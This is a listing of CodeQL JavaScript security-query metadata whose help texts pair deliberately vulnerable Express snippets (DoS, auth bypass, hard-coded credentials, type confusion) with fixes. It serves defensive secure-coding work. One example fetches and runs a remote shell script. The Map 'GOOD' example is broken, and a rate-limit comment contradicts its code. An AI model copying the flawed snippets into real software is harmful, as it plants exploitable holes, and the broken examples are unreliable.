          // ...
        }
      }

      app.get('/perform/:action/:payload', function(req, res) {
        let action = actions[req.params.action];
        // BAD: `action` may not be a function
        res.end(action(req.params.payload));
      });

      ```
      The intention is to allow clients to invoke the `play` or `pause` method, but there is no check that `action` is actually the name of a method stored in `actions`. If, for example, `action` is `rewind`, `action` will be `undefined` and the call will result in a runtime error.

      The easiest way to prevent this is to turn `actions` into a `Map` and using `Map.prototype.has` to check whether the method name is valid before looking it up.


      ```javascript
      var express = require('express');
      var app = express();

      var actions = new Map();
      actions.set("play", function play(data) {
        // ...
      });
      actions.set("pause", function pause(data) {
        // ...
      });

      app.get('/perform/:action/:payload', function(req, res) {
        if (actions.has(req.params.action)) {
          if (typeof actions.get(req.params.action) === 'function'){
            let action = actions.get(req.params.action);
          }
          // GOOD: `action` is either the `play` or the `pause` function from above
          res.end(action(req.params.payload));
        } else {
          res.end("Unsupported action.");
        }
      });

      ```
      If `actions` cannot be turned into a `Map`, a `hasOwnProperty` check should be added to validate the method name:


      ```javascript
      var express = require('express');
      var app = express();

      var actions = {
        play(data) {
          // ...
        },
        pause(data) {
          // ...
        }
      }

      app.get('/perform/:action/:payload', function(req, res) {
        if (actions.hasOwnProperty(req.params.action)) {
          let action = actions[req.params.action];
          if (typeof action === 'function') {
            // GOOD: `action` is an own method of `actions`
            res.end(action(req.params.payload));
            return;
          }
        }
        res.end("Unsupported action.");
      });

      ```

      ## References
      * OWASP: [Denial of Service](https://www.owasp.org/index.php/Denial_of_Service).
      * MDN: [Map](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map).
      * MDN: [Object.prototype](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/prototype).
      * Common Weakness Enumeration: [CWE-754](https://cwe.mitre.org/data/definitions/754.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-770/MissingRateLimiting.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-770/MissingRateLimiting.bqrs
    metadata:
      name: Missing rate limiting
      description: |-
        An HTTP request handler that performs expensive operations without
                      restricting the rate at which operations can be carried out is vulnerable
                      to denial-of-service attacks.
      kind: problem
      problem.severity: warning
      security-severity: 7.5
      precision: high
      id: js/missing-rate-limiting
      tags: |-
        security
               external/cwe/cwe-770
               external/cwe/cwe-307
               external/cwe/cwe-400
    queryHelp: |
      # Missing rate limiting
      HTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.


      ## Recommendation
      A rate-limiting middleware should be used to prevent such attacks.


      ## Example
      The following example shows an Express application that serves static files without rate limiting:


      ```javascript
      var express = require('express');
      var app = express();

      app.get('/:path', function(req, res) {
        let path = req.params.path;
        if (isValidPath(path))
          res.sendFile(path);
      });

      ```
      To prevent denial-of-service attacks, the `express-rate-limit` package can be used:


      ```javascript
      var express = require('express');
      var app = express();

      // set up rate limiter: maximum of five requests per minute
      var RateLimit = require('express-rate-limit');
      var limiter = RateLimit({
        windowMs: 15 * 60 * 1000, // 15 minutes
        max: 100, // max 100 requests per windowMs
      });

      // apply rate limiter to all requests
      app.use(limiter);

      app.get('/:path', function(req, res) {
        let path = req.params.path;
        if (isValidPath(path))
          res.sendFile(path);
      });

      ```

      ## References
      * OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).
      * Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).
      * NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).
      * Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).
      * Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).
      * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-770/ResourceExhaustion.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-770/ResourceExhaustion.bqrs
    metadata:
      name: Resource exhaustion
      description: |-
        Allocating objects or timers with user-controlled
                      sizes or durations can cause resource exhaustion.
      kind: path-problem
      problem.severity: warning
      security-severity: 7.5
      id: js/resource-exhaustion
      precision: high
      tags: |-
        security
               external/cwe/cwe-400
               external/cwe/cwe-770
    queryHelp:
      "# Resource exhaustion\nApplications are constrained by how many resources\
      \ they can make use of. Failing to respect these constraints may cause the application\
      \ to be unresponsive or crash. It is therefore problematic if attackers can control\
      \ the sizes or lifetimes of allocated objects.\n\n\n## Recommendation\nEnsure\
      \ that attackers can not control object sizes and their lifetimes. If object sizes\
      \ and lifetimes must be controlled by external parties, ensure you restrict the\
      \ object sizes and lifetimes so that they are within acceptable ranges.\n\n\n\
      ## Example\nThe following example allocates a buffer with a user-controlled size.\n\
      \n\n```javascript\nvar http = require(\"http\"),\n    url = require(\"url\");\n\
      \nvar server = http.createServer(function(req, res) {\n\tvar size = parseInt(url.parse(req.url,\
      \ true).query.size);\n\n\tlet buffer = Buffer.alloc(size); // BAD\n\n\t// ...\
      \ use the buffer\n});\n```\nThis is problematic since an attacker can choose a\
      \ size that makes the application run out of memory. Even worse, in older versions\
      \ of Node.js, this could leak confidential memory. To prevent such attacks, limit\
      \ the buffer size:\n\n\n```javascript\nvar http = require(\"http\"),\n    url\
      \ = require(\"url\");\n\nvar server = http.createServer(function(req, res) {\n\
      \tvar size = parseInt(url.parse(req.url, true).query.size);\n\n\tif (size > 1024)\
      \ {\n\t\tres.statusCode = 400;\n\t\tres.end(\"Bad request.\");\n\t\treturn;\n\t\
      }\n\n\tlet buffer = Buffer.alloc(size); // GOOD\n\n\t// ... use the buffer\n});\n\
      ```\n\n## Example\nAs another example, consider an application that allocates\
      \ an array with a user-controlled size, and then fills it with values:\n\n\n```javascript\n\
      var http = require(\"http\"),\n    url = require(\"url\");\n\nvar server = http.createServer(function(req,\
      \ res) {\n\tvar size = parseInt(url.parse(req.url, true).query.size);\n\n\tlet\
      \ dogs = new Array(size).fill(\"dog\"); // BAD\n\n\t// ... use the dog\n});\n\
      ```\nThe allocation of the array itself is not problematic since arrays are allocated\
      \ sparsely, but the subsequent filling of the array will take a long time, causing\
      \ the application to be unresponsive, or even run out of memory. Again, a limit\
      \ on the size will prevent the attack:\n\n\n```javascript\nvar http = require(\"\
      http\"),\n    url = require(\"url\");\n\nvar server = http.createServer(function(req,\
      \ res) {\n\tvar size = parseInt(url.parse(req.url, true).query.size);\n\n\tif\
      \ (size > 1024) {\n\t\tres.statusCode = 400;\n\t\tres.end(\"Bad request.\");\n\
      \t\treturn;\n\t}\n\n\tlet dogs = new Array(size).fill(\"dog\"); // GOOD\n\n\t\
      // ... use the dogs\n});\n```\n\n## Example\nFinally, the following example lets\
      \ a user choose a delay after which a function is executed:\n\n\n```javascript\n\
      var http = require(\"http\"),\n    url = require(\"url\");\n\nvar server = http.createServer(function(req,\
      \ res) {\n\tvar delay = parseInt(url.parse(req.url, true).query.delay);\n\n\t\
      setTimeout(f, delay); // BAD\n\n});\n\n```\nThis is problematic because a large\
      \ delay essentially makes the application wait indefinitely before executing the\
      \ function. Repeated registrations of such delays will therefore use up all of\
      \ the memory in the application. A limit on the delay will prevent the attack:\n\
      \n\n```javascript\nvar http = require(\"http\"),\n    url = require(\"url\");\n\
      \nvar server = http.createServer(function(req, res) {\n\tvar delay = parseInt(url.parse(req.url,\
      \ true).query.delay);\n\n\tif (delay > 1000) {\n\t\tres.statusCode = 400;\n\t\t\
      res.end(\"Bad request.\");\n\t\treturn;\n\t}\n\n\tsetTimeout(f, delay); // GOOD\n\
      \n});\n\n```\n\n## References\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n\
      * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n\
      * Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-776/XmlBomb.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-776/XmlBomb.bqrs
    metadata:
      name: XML internal entity expansion
      description: |-
        Parsing user input as an XML document with arbitrary internal
                      entity expansion is vulnerable to denial-of-service attacks.
      kind: path-problem
      problem.severity: warning
      security-severity: 7.5
      precision: high
      id: js/xml-bomb
      tags: |-
        security
               external/cwe/cwe-776
               external/cwe/cwe-400
    queryHelp: |
      # XML internal entity expansion
      Parsing untrusted XML files with a weakly configured XML parser may be vulnerable to denial-of-service (DoS) attacks exploiting uncontrolled internal entity expansion.

      In XML, so-called *internal entities* are a mechanism for introducing an abbreviation for a piece of text or part of a document. When a parser that has been configured to expand entities encounters a reference to an internal entity, it replaces the entity by the data it represents. The replacement text may itself contain other entity references, which are expanded recursively. This means that entity expansion can increase document size dramatically.

      If untrusted XML is parsed with entity expansion enabled, a malicious attacker could submit a document that contains very deeply nested entity definitions, causing the parser to take a very long time or use large amounts of memory. This is sometimes called an *XML bomb* attack.


      ## Recommendation
      The safest way to prevent XML bomb attacks is to disable entity expansion when parsing untrusted data. How this is done depends on the library being used. Note that some libraries, such as recent versions of `libxmljs` (though not its SAX parser API), disable entity expansion by default, so unless you have explicitly enabled entity expansion, no further action is needed.


      ## Example
      The following example uses the XML parser provided by the `node-expat` package to parse a string `xmlSrc`. If that string is from an untrusted source, this code may be vulnerable to a DoS attack, since `node-expat` expands internal entities by default:


      ```javascript
      const app = require("express")(),
        expat = require("node-expat");

      app.post("upload", (req, res) => {
        let xmlSrc = req.body,
          parser = new expat.Parser();
        parser.on("startElement", handleStart);
        parser.on("text", handleText);
        parser.write(xmlSrc);
      });

      ```
      At the time of writing, `node-expat` does not provide a way of controlling entity expansion, but the example could be rewritten to use the `sax` package instead, which only expands standard entities such as `&amp;`:


      ```javascript
      const app = require("express")(),
        sax = require("sax");

      app.post("upload", (req, res) => {
        let xmlSrc = req.body,
          parser = sax.parser(true);
        parser.onopentag = handleStart;
        parser.ontext = handleText;
        parser.write(xmlSrc);
      });

      ```

      ## References
      * Wikipedia: [Billion Laughs](https://en.wikipedia.org/wiki/Billion_laughs).
      * Bryan Sullivan: [Security Briefs - XML Denial of Service Attacks and Defenses](https://msdn.microsoft.com/en-us/magazine/ee335713.aspx).
      * Common Weakness Enumeration: [CWE-776](https://cwe.mitre.org/data/definitions/776.html).
      * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-798/HardcodedCredentials.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-798/HardcodedCredentials.bqrs
    metadata:
      name: Hard-coded credentials
      description: |-
        Hard-coding credentials in source code may enable an attacker
                      to gain unauthorized access.
      kind: path-problem
      problem.severity: warning
      security-severity: 9.8
      precision: low
      id: js/hardcoded-credentials
      tags: |-
        security
               external/cwe/cwe-259
               external/cwe/cwe-321
               external/cwe/cwe-798
    queryHelp: |
      # Hard-coded credentials
      Including unencrypted hard-coded authentication credentials in source code is dangerous because the credentials may be easily discovered. For example, the code may be open source, or it may be leaked or accidentally revealed, making the credentials visible to an attacker. This, in turn, might enable them to gain unauthorized access, or to obtain privileged information.


      ## Recommendation
      Remove hard-coded credentials, such as user names, passwords and certificates, from source code. Instead, place them in configuration files, environment variables or other data stores if necessary. If possible, store configuration files including credential data separately from the source code, in a secure location with restricted access.

      If the credentials are a placeholder value, make sure the value is obviously a placeholder by using a name such as `"SampleToken"` or `"MyPassword"`.


      ## Example
      The following code example connects to an HTTP request using an hard-codes authentication header:


      ```javascript
      let base64 = require('base-64');

      let url = 'http://example.org/auth';
      let username = 'user';
      let password = 'passwd';

      let headers = new Headers();

      headers.append('Content-Type', 'text/json');
      headers.append('Authorization', 'Basic' + base64.encode(username + ":" + password));

      fetch(url, {
                method:'GET',
                headers: headers
             })
      .then(response => response.json())
      .then(json => console.log(json))
      .done();

      ```
      Instead, user name and password can be supplied through the environment variables `username` and `password`, which can be set externally without hard-coding credentials in the source code.


      ```javascript
      let base64 = require('base-64');

      let url = 'http://example.org/auth';
      let username = process.env.USERNAME;
      let password = process.env.PASSWORD;

      let headers = new Headers();

      headers.append('Content-Type', 'text/json');
      headers.append('Authorization', 'Basic' + base64.encode(username + ":" + password));

      fetch(url, {
              method:'GET',
              headers: headers
           })
      .then(response => response.json())
      .then(json => console.log(json))
      .done();

      ```

      ## Example
      The following code example connects to a Postgres database using the `pg` package and hard-codes user name and password:


      ```javascript
      const pg = require("pg");

      const client = new pg.Client({
        user: "bob",
        host: "database.server.com",
        database: "mydb",
        password: "correct-horse-battery-staple",
        port: 3211
      });
      client.connect();

      ```
      Instead, user name and password can be supplied through the environment variables `PGUSER` and `PGPASSWORD`, which can be set externally without hard-coding credentials in the source code.


      ## References
      * OWASP: [Use of hard-coded password](https://www.owasp.org/index.php/Use_of_hard-coded_password).
      * Common Weakness Enumeration: [CWE-259](https://cwe.mitre.org/data/definitions/259.html).
      * Common Weakness Enumeration: [CWE-321](https://cwe.mitre.org/data/definitions/321.html).
      * Common Weakness Enumeration: [CWE-798](https://cwe.mitre.org/data/definitions/798.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-807/ConditionalBypass.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-807/ConditionalBypass.bqrs
    metadata:
      name: User-controlled bypass of security check
      description:
        Conditions that the user controls are not suited for making security-related
        decisions.
      kind: path-problem
      problem.severity: error
      security-severity: 7.8
      precision: medium
      id: js/user-controlled-bypass
      tags: |-
        security
               external/cwe/cwe-807
               external/cwe/cwe-290
    queryHelp: |
      # User-controlled bypass of security check
      Using user-controlled data in a permissions check may allow a user to gain unauthorized access to protected functionality or data.


      ## Recommendation
      When checking whether a user is authorized for a particular activity, do not use data that is entirely controlled by that user in the permissions check. If necessary, always validate the input, ideally against a fixed list of expected values.

      Similarly, do not decide which permission to check for, based on user data. In particular, avoid using computation to decide which permissions to check for. Use fixed permissions for particular actions, rather than generating the permission to check for.


      ## Example
      In this example, we have a server that shows private information for a user, based on the request parameter `userId`. For privacy reasons, users may only view their own private information, so the server checks that the request parameter `userId` matches a cookie value for the user who is logged in.


      ```javascript
      var express = require('express');
      var app = express();
      // ...
      app.get('/full-profile/:userId', function(req, res) {

          if (req.cookies.loggedInUserId !== req.params.userId) {
              // BAD: login decision made based on user controlled data
              requireLogin();
          } else {
              // ... show private information
          }

      });

      ```
      This security check is, however, insufficient since an attacker can craft their cookie values to match those of any user. To prevent this, the server can cryptographically sign the security critical cookie values:


      ```javascript
      var express = require('express');
      var app = express();
      // ...
      app.get('/full-profile/:userId', function(req, res) {

          if (req.signedCookies.loggedInUserId !== req.params.userId) {
              // GOOD: login decision made based on server controlled data
              requireLogin();
          } else {
              // ... show private information
          }

      });

      ```

      ## References
      * Common Weakness Enumeration: [CWE-807](https://cwe.mitre.org/data/definitions/807.html).
      * Common Weakness Enumeration: [CWE-290](https://cwe.mitre.org/data/definitions/290.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-807/DifferentKindsComparisonBypass.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-807/DifferentKindsComparisonBypass.bqrs
    metadata:
      name: Comparison of user-controlled data of different kinds
      description:
        Comparing different kinds of HTTP request data may be a symptom of
        an insufficient security check.
      kind: problem
      problem.severity: error
      security-severity: 7.8
      precision: low
      id: js/different-kinds-comparison-bypass
      tags: |-
        security
               external/cwe/cwe-807
               external/cwe/cwe-290
    queryHelp: |
      # Comparison of user-controlled data of different kinds
      Many programmers mistakenly believe that information stored in cookies and hidden HTML form fields is tamper-proof and cannot be changed by the user. Hence they might try to verify other request data by comparing it against this information, for example by checking whether a user name embedded in a request parameter matches data stored in an (unsigned) cookie. In fact, however, all of these sources of data are user-controlled, so a malicious user can easily bypass such checks to gain unauthorized access to protected functionality or data.


      ## Recommendation
      When checking whether a user is authorized for a particular activity, do not use data that is entirely controlled by that user in the permissions check. If necessary, always validate the input, ideally against a fixed list of expected values.

      Similarly, do not decide which permission to check for, based on user data. In particular, avoid using computation to decide which permissions to check for. Use fixed permissions for particular actions, rather than generating the permission to check for.


      ## Example
      In this example, we have a server that shows private information for a user, based on the request parameter `userId`. For privacy reasons, users may only view their own private information, so the server checks that the request parameter `userId` matches a cookie value for the user who is logged in.


      ```javascript
      var express = require('express');
      var app = express();
      // ...
      app.get('/full-profile/:userId', function(req, res) {

          if (req.cookies.loggedInUserId !== req.params.userId) {
              // BAD: login decision made based on user controlled data
              requireLogin();
          } else {
              // ... show private information
          }

      });

      ```
      This security check is, however, insufficient since an attacker can craft their cookie values to match those of any user. To prevent this, the server can cryptographically sign the security critical cookie values:


      ```javascript
      var express = require('express');
      var app = express();
      // ...
      app.get('/full-profile/:userId', function(req, res) {

          if (req.signedCookies.loggedInUserId !== req.params.userId) {
              // GOOD: login decision made based on server controlled data
              requireLogin();
          } else {
              // ... show private information
          }

      });

      ```

      ## References
      * Common Weakness Enumeration: [CWE-807](https://cwe.mitre.org/data/definitions/807.html).
      * Common Weakness Enumeration: [CWE-290](https://cwe.mitre.org/data/definitions/290.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-829/InsecureDownload.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-829/InsecureDownload.bqrs
    metadata:
      name: Download of sensitive file through insecure connection
      description: |-
        Downloading executables and other sensitive files over an insecure connection
                      opens up for potential man-in-the-middle attacks.
      kind: path-problem
      problem.severity: error
      security-severity: 8.1
      precision: high
      id: js/insecure-download
      tags: |-
        security
               external/cwe/cwe-829
    queryHelp: |
      # Download of sensitive file through insecure connection
      Downloading executables or other sensitive files over an unencrypted connection can leave a server open to man-in-the-middle attacks (MITM). Such an attack can allow an attacker to insert arbitrary content into the downloaded file, and in the worst case, allow the attacker to execute arbitrary code on the vulnerable system.


      ## Recommendation
      Use a secure transfer protocol when downloading executables or other sensitive files.


      ## Example
      In this example, a server downloads a shell script from a remote URL using the `node-fetch` library, and then executes this shell script.


      ```javascript
      const fetch = require("node-fetch");
      const cp = require("child_process");

      fetch('http://mydownload.example.org/myscript.sh')
          .then(res => res.text())
          .then(script => cp.execSync(script));
      ```
      The HTTP protocol is vulnerable to MITM, and thus an attacker could potentially replace the downloaded shell script with arbitrary code, which gives the attacker complete control over the system.

      The issue has been fixed in the example below by replacing the HTTP protocol with the HTTPS protocol.


      ```javascript
      const fetch = require("node-fetch");
      const cp = require("child_process");

      fetch('https://mydownload.example.org/myscript.sh')
          .then(res => res.text())
          .then(script => cp.execSync(script));
      ```

      ## References
      * Wikipedia: [Man-in-the-middle attack](https://en.wikipedia.org/wiki/Man-in-the-middle_attack)
      * Common Weakness Enumeration: [CWE-829](https://cwe.mitre.org/data/definitions/829.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-830/FunctionalityFromUntrustedDomain.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-830/FunctionalityFromUntrustedDomain.bqrs
    metadata:
      name: Untrusted domain used in script or other content
      description:
        Using a resource from an untrusted or compromised domain makes your
        code vulnerable to receiving malicious code.
      kind: problem
      security-severity: 7.2
      problem.severity: error
      id: js/functionality-from-untrusted-domain
      precision: high
      tags: |-
        security
               external/cwe/cwe-830
    queryHelp: |
      # Untrusted domain used in script or other content
      Content Delivery Networks (CDNs) are used to deliver content to users quickly and efficiently. However, they can change hands or be operated by untrustworthy owners, risking the security of the sites that use them. Some CDN domains are operated by entities that have used CDNs to deliver malware, which this query identifies.

      For example, `polyfill.io` was a popular JavaScript CDN, used to support new web browser standards on older browsers. In February 2024 the domain was sold, and in June 2024 it was publicised that the domain had been used to serve malicious scripts. It was taken down later in that month, leaving a window where sites that used the service could have been compromised. The same operator runs several other CDNs, undermining trust in those too.

      Including a resource from an untrusted source or using an untrusted channel may allow an attacker to include arbitrary code in the response. When including an external resource (for example, a `script` element) on a page, it is important to ensure that the received data is not malicious.

      Even when `https` is used, an untrustworthy operator might deliver malware.

      See the \[\`CUSTOMIZING.md\`\](https://github.com/github/codeql/blob/main/javascript/ql/src/Security/CWE-830/CUSTOMIZING.md) file in the source code for this query for information on how to extend the list of untrusted domains used by this query.


      ## Recommendation
      Carefully research the ownership of a Content Delivery Network (CDN) before using it in your application.

      If you find code that originated from an untrusted domain in your application, you should review your logs to check for compromise.

      To help mitigate the risk of including a script that could be compromised in the future, consider whether you need to use polyfill or another library at all. Modern browsers do not require a polyfill, and other popular libraries were made redundant by enhancements to HTML 5.

      If you do need a polyfill service or library, move to using a CDN that you trust.

      When you use a `script` or `link` element, you should check for [subresource integrity (SRI)](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity), and pin to a hash of a version of the service that you can trust (for example, because you have audited it for security and unwanted features). A dynamic service cannot be easily used with SRI. Nevertheless, it is possible to list multiple acceptable SHA hashes in the `integrity` attribute, such as hashes for the content required for the major browsers used by your users.

      You can also choose to self-host an uncompromised version of the service or library.


      ## Example
      The following example loads the Polyfill.io library from the `polyfill.io` CDN. This use was open to malicious scripts being served by the CDN.


      ```html
      <html>
          <head>
              <title>Polyfill.io demo</title>
              <script src="https://cdn.polyfill.io/v2/polyfill.min.js" crossorigin="anonymous"></script>
          </head>
          <body>
              ...
          </body>
      </html>
      ```
      Instead, load the Polyfill library from a trusted CDN, as in the next example:


      ```html
      <html>
          <head>
              <title>Polyfill demo - Cloudflare hosted with pinned version (but no integrity checking, since it is dynamically generated)</title>
              <script src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?version=4.8.0" crossorigin="anonymous"></script>
          </head>
          <body>
              ...
          </body>
      </html>
      ```
      If you know which browsers are used by the majority of your users, you can list the hashes of the polyfills for those browsers:


      ```html
      <html>
          <head>
              <title>Polyfill demo - Cloudflare hosted with pinned version (with integrity checking for a *very limited* browser set - just an example!)</title>
              <script src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?version=4.8.0" integrity="sha384-i0IGVuZBkKZqwXTD4CH4kcksIbFx7WKFMdxN8zUhLFHpLdELF0ym0jxa6UvLhW8/ sha384-3d4jRKquKl90C9aFG+eH4lPJmtbPHgACWHrp+VomFOxF8lzx2jxqeYkhpRg18UWC" crossorigin="anonymous"></script>
          </head>
          <body>
              ...
          </body>
      </html>
      ```

      ## References
      * Sansec: [Polyfill supply chain attack hits 100K+ sites](https://sansec.io/research/polyfill-supply-chain-attack)
      * Cloudflare: [Upgrade the web. Automatically. Delivers only the polyfills required by the user's web browser.](https://cdnjs.cloudflare.com/polyfill)
      * Fastly: [New options for Polyfill.io users](https://community.fastly.com/t/new-options-for-polyfill-io-users/2540)
      * Wikipedia: [Polyfill (programming)](https://en.wikipedia.org/wiki/Polyfill_(programming))
      * MDN Web Docs: [Subresource Integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)
      * Common Weakness Enumeration: [CWE-830](https://cwe.mitre.org/data/definitions/830.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-830/FunctionalityFromUntrustedSource.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-830/FunctionalityFromUntrustedSource.bqrs
    metadata:
      name: Inclusion of functionality from an untrusted source
      description: |-
        Including functionality from an untrusted source may allow
                      an attacker to control the functionality and execute arbitrary code.
      kind: problem
      problem.severity: warning
      security-severity: 6.0
      precision: high
      id: js/functionality-from-untrusted-source
      tags: |-
        security
               external/cwe/cwe-830
    queryHelp: |
      # Inclusion of functionality from an untrusted source
      Including a resource from an untrusted source or using an untrusted channel may allow an attacker to include arbitrary code in the response. When including an external resource (for example, a `script` element or an `iframe` element) on a page, it is important to ensure that the received data is not malicious.

      When including external resources, it is possible to verify that the responding server is the intended one by using an `https` URL. This prevents a MITM (man-in-the-middle) attack where an attacker might have been able to spoof a server response.

      Even when `https` is used, an attacker might still compromise the server. When you use a `script` element, you can check for subresource integrity - that is, you can check the contents of the data received by supplying a cryptographic digest of the expected sources to the `script` element. The script will only load sources that match the digest and an attacker will be unable to modify the script even when the server is compromised.

      Subresource integrity (SRI) checking is commonly recommended when importing a fixed version of a library - for example, from a CDN (content-delivery network). Then, the fixed digest of that version of the library can easily be added to the `script` element's `integrity` attribute.

      A dynamic service cannot be easily used with SRI. Nevertheless, it is possible to list multiple acceptable SHA hashes in the `integrity` attribute, such as those for the content generated for major browers used by your users.

      See the \[\`CUSTOMIZING.md\`\](https://github.com/github/codeql/blob/main/javascript/ql/src/Security/CWE-830/CUSTOMIZING.md) file in the source code for this query for information on how to extend the list of hostnames required to use SRI by this query.


      ## Recommendation
      When an `iframe` element is used to embed a page, it is important to use an `https` URL.

      When using a `script` element to load a script, it is important to use an `https` URL and to consider checking subresource integrity.


      ## Example
      The following example loads the jQuery library from the jQuery CDN without using `https` and without checking subresource integrity.


      ```html
      <html>
          <head>
              <title>jQuery demo</title>
              <script src="http://code.jquery.com/jquery-3.6.0.slim.min.js" crossorigin="anonymous"></script>
          </head>
          <body>
              ...
          </body>
      </html>
      ```
      Instead, loading jQuery from the same domain using `https` and checking subresource integrity is recommended, as in the next example.


      ```html
      <html>
          <head>
              <title>jQuery demo</title>
              <script src="https://code.jquery.com/jquery-3.6.0.slim.min.js" integrity="sha256-u7e5khyithlIdTpu22PHhENmPcRdFiHRjhAuHcs05RI=" crossorigin="anonymous"></script>
          </head>
          <body>
              ...
          </body>
      </html>
      ```

      ## References
      * MDN: [Subresource Integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)
      * Smashing Magazine: [Understanding Subresource Integrity](https://www.smashingmagazine.com/2019/04/understanding-subresource-integrity/)
      * Common Weakness Enumeration: [CWE-830](https://cwe.mitre.org/data/definitions/830.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-834/LoopBoundInjection.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-834/LoopBoundInjection.bqrs
    metadata:
      name: Loop bound injection
      description: |-
        Iterating over an object with a user-controlled .length
                      property can cause indefinite looping.
      kind: path-problem
      problem.severity: warning
      security-severity: 7.5
      id: js/loop-bound-injection
      tags: |-
        security
               external/cwe/cwe-834
               external/cwe/cwe-730
      precision: high
    queryHelp:
      "# Loop bound injection\nUsing the `.length` property of an untrusted\
      \ object as a loop bound may cause indefinite looping since a malicious attacker\
      \ can set the `.length` property to a very large number. For example, when a program\
      \ that expects an array is passed a JSON object such as `{length: 1e100}`, the\
      \ loop will be run for 10<sup>100</sup> iterations. This may cause the program\
      \ to hang or run out of memory, which can be used to mount a denial-of-service\
      \ (DoS) attack.\n\n\n## Recommendation\nEither check that the object is indeed\
      \ an array or limit the size of the `.length` property.\n\n\n## Example\nIn the\
      \ example below, an HTTP request handler iterates over a user-controlled object\
      \ `obj` using the `obj.length` property in order to copy the elements from `obj`\
      \ to an array.\n\n\n```javascript\nvar express = require('express');\nvar app\
      \ = express();\n\napp.post(\"/foo\", (req, res) => {\n    var obj = req.body;\n\
      \n    var ret = [];\n\n    // Potential DoS if obj.length is large.\n    for (var\
      \ i = 0; i < obj.length; i++) {\n        ret.push(obj[i]);\n    }\n});\n\n```\n\
      This is not secure since an attacker can control the value of `obj.length`, and\
      \ thereby cause the loop to iterate indefinitely. Here the potential DoS is fixed\
      \ by enforcing that the user-controlled object is an array.\n\n\n```javascript\n\
      var express = require('express');\nvar app = express();\n\napp.post(\"/foo\",\
      \ (req, res) => {\n    var obj = req.body;\n    \n    if (!(obj instanceof Array))\
      \ { // Prevents DoS.\n        return [];\n    }\n\n    var ret = [];\n\n    for\
      \ (var i = 0; i < obj.length; i++) {\n        ret.push(obj[i]);\n    }\n});\n\n\
      ```\n\n## References\n* Common Weakness Enumeration: [CWE-834](https://cwe.mitre.org/data/definitions/834.html).\n\
      * Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-843/TypeConfusionThroughParameterTampering.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-843/TypeConfusionThroughParameterTampering.bqrs
    metadata:
      name: Type confusion through parameter tampering
      description:
        Sanitizing an HTTP request parameter may be ineffective if the user
        controls its type.
      kind: path-problem
      problem.severity: error
      security-severity: 9.8
      precision: high
      id: js/type-confusion-through-parameter-tampering
      tags: |-
        security
               external/cwe/cwe-843
    queryHelp: |
      # Type confusion through parameter tampering
      Sanitizing untrusted HTTP request parameters is a common technique for preventing injection attacks such as SQL injection or path traversal. This is sometimes done by checking if the request parameters contain blacklisted substrings.

      However, sanitizing request parameters assuming they have type `String` and using the builtin string methods such as `String.prototype.indexOf` is susceptible to type confusion attacks. In a type confusion attack, an attacker tampers with an HTTP request parameter such that it has a value of type `Array` instead of the expected type `String`. Furthermore, the content of the array has been crafted to bypass sanitizers by exploiting that some identically named methods of strings and arrays behave differently.


      ## Recommendation
      Check the runtime type of sanitizer inputs if the input type is user-controlled.

      An even safer alternative is to design the application so that sanitization is not needed, for instance by using prepared statements for SQL queries.


      ## Example
      For example, Node.js server frameworks usually present request parameters as strings. But if an attacker sends multiple request parameters with the same name, then the request parameter is represented as an array instead.

      In the following example, a sanitizer checks that a path does not contain the `".."` string, which would allow an attacker to access content outside a user-accessible directory.


      ```javascript
      var app = require("express")(),
        path = require("path");

      app.get("/user-files", function(req, res) {
        var file = req.param("file");
        if (file.indexOf("..") !== -1) {
          // BAD
          // we forbid relative paths that contain ..
          // as these could leave the public directory
          res.status(400).send("Bad request");
        } else {
          var absolute = path.resolve("/public/" + file);
          console.log("Sending file: %s", absolute);
